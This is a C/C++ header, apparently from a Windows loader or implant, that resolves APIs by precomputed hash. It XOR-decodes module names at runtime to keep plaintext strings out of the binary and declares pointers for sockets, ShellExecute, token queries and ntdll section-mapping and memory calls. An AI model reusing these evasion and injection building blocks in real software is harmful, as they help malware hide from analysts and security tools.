// ApiHash.h
#pragma once
#include "stdafx.h"

// ================= 把 hash_gen.py 的输出粘贴到这里 =================
// ===== API 哈希（自动生成，勿手改） =====
#define H_CreateFileA                  0xBDCAC9CE
#define H_CloseHandle                  0xFABA0065
#define H_VirtualProtect               0x820621F3
#define H_FreeLibrary                  0xAB45C5EE
#define H_GetProcessHeap               0x86FE8652
#define H_HeapAlloc                    0x0184ED74
#define H_HeapFree                     0x29630F3D
#define H_IsBadReadPtr                 0x61621C06
#define H_Sleep                        0x2FA62CA8
#define H_GetCurrentProcess            0x6DD8A845
#define H_GetModuleFileNameA           0x99FBC63D
#define H_GetEnvironmentVariableA      0xC3D48B63
#define H_GetTickCount                 0x0F4D8B55
#define H_OpenProcessToken             0x5E5AD0C3
#define H_GetTokenInformation          0x035F513A
#define H_ShellExecuteA                0x0B0FF5BF
#define H_WSAStartup                   0x20125C5F
#define H_socket                       0x9012766C
#define H_connect                      0xAAE0CCF9
#define H_send                         0x7261C8AF
#define H_recv                         0xECE4502D
#define H_closesocket                  0x06834302
#define H_gethostbyname                0x296EC883
#define H_WSAGetLastError              0xDFBDD85C
#define H_WSACleanup                   0x8BD299C2
#define H_NtCreateSection              0x3C59F362
#define H_NtMapViewOfSection           0xCBC9E1AE
#define H_NtUnmapViewOfSection         0x53B808C5
#define H_NtClose                      0x6B372C05
#define H_NtAllocateVirtualMemory      0xCA67B978
#define H_NtProtectVirtualMemory       0xBD799926
#define H_NtFreeVirtualMemory          0xB51CC567
#define H_LdrLoadDll                   0x7B566B5F

// ===== 模块哈希（大小写不敏感） =====
#define HM_kernel32_dll 0xA3E6F6C3
#define HM_ws2_32_dll   0xF730D303
#define HM_user32_dll   0xC0323159
#define HM_shell32_dll  0x4F644736
#define HM_advapi32_dll 0x39794115
#define HM_ntdll_dll    0xA62A3B3B


// ---------- 运行时异或解密（避免明文字符串进入 .rdata） ----------
static inline void XorDecode(char* out, const unsigned char* enc, int n, unsigned char key)
{
    for (int i = 0; i < n; i++) out[i] = (char)(enc[i] ^ key);
    out[n] = 0;
}
#define XOR_KEY 0x5A

// ---------- 基础哈希/解析 ----------
DWORD   HashApiString(const char* str);
HMODULE GetModuleByHash(DWORD modHash);
FARPROC GetProcByHash(HMODULE hMod, DWORD funcHash);
FARPROC GetProcByOrdinal(HMODULE hMod, WORD ordinal);

// ---------- 模块缓存 ----------
HMODULE GetKernel32();
HMODULE GetUser32();
HMODULE GetShell32();
HMODULE GetAdvApi32();
HMODULE GetNtdll();

// 按哈希隐藏加载模块（LdrLoadDll；模块名异或存储，不出现明文）
HMODULE LoadModuleByHash(DWORD modHash);

// ---------- 统一初始化 ----------
void InitApiHash();

// ---------- kernel32 函数指针类型 ----------
typedef HANDLE  (WINAPI *CreateFileAT)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *CloseHandleT)(HANDLE);
typedef BOOL    (WINAPI *VirtualProtectT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *FreeLibraryT)(HMODULE);
typedef HANDLE  (WINAPI *GetProcessHeapT)(VOID);
typedef LPVOID  (WINAPI *HeapAllocT)(HANDLE, DWORD, SIZE_T);
typedef BOOL    (WINAPI *HeapFreeT)(HANDLE, DWORD, LPVOID);
typedef BOOL    (WINAPI *IsBadReadPtrT)(const void*, UINT_PTR);
typedef VOID    (WINAPI *SleepT)(DWORD);
typedef HANDLE  (WINAPI *GetCurrentProcessT)(VOID);
typedef DWORD   (WINAPI *GetModuleFileNameAT)(HMODULE, LPSTR, DWORD);
typedef DWORD   (WINAPI *GetEnvironmentVariableAT)(LPCSTR, LPSTR, DWORD);
typedef DWORD   (WINAPI *GetTickCountT)(VOID);

// ---------- advapi32 ----------
typedef BOOL (WINAPI *OpenProcessTokenT)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *GetTokenInformationT)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

// ---------- shell32 ----------
typedef HINSTANCE (WINAPI *ShellExecuteAT)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);

// ---------- ntdll ----------
typedef NTSTATUS (NTAPI *NtCreateSectionT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *NtMapViewOfSectionT)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtUnmapViewOfSectionT)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *NtCloseT)(HANDLE);
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemoryT)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemoryT)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtFreeVirtualMemoryT)(HANDLE, PVOID*, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *LdrLoadDllT)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);

// ---------- 全局函数指针 ----------
extern CreateFileAT          pCreateFileA;
extern CloseHandleT          pCloseHandle;
extern VirtualProtectT       pVirtualProtect;
extern FreeLibraryT          pFreeLibrary;
extern GetProcessHeapT       pGetProcessHeap;
extern HeapAllocT            pHeapAlloc;
extern HeapFreeT             pHeapFree;
extern IsBadReadPtrT         pIsBadReadPtr;
extern SleepT                pSleep;
extern GetCurrentProcessT    pGetCurrentProcess;
extern GetModuleFileNameAT   pGetModuleFileNameA;
extern GetEnvironmentVariableAT pGetEnvironmentVariableA;
extern GetTickCountT         pGetTickCount;
extern OpenProcessTokenT     pOpenProcessToken;
extern GetTokenInformationT  pGetTokenInformation;
extern ShellExecuteAT        pShellExecuteA;
extern NtCreateSectionT        pNtCreateSection;
extern NtMapViewOfSectionT     pNtMapViewOfSection;
extern NtUnmapViewOfSectionT   pNtUnmapViewOfSection;
extern NtCloseT                pNtClose;
extern NtAllocateVirtualMemoryT pNtAllocateVirtualMemory;
extern NtProtectVirtualMemoryT pNtProtectVirtualMemory;
extern NtFreeVirtualMemoryT    pNtFreeVirtualMemory;
extern LdrLoadDllT             pLdrLoadDll;

// ---------- 初始化 ntdll 部分 ----------
void InitNtdllApis();
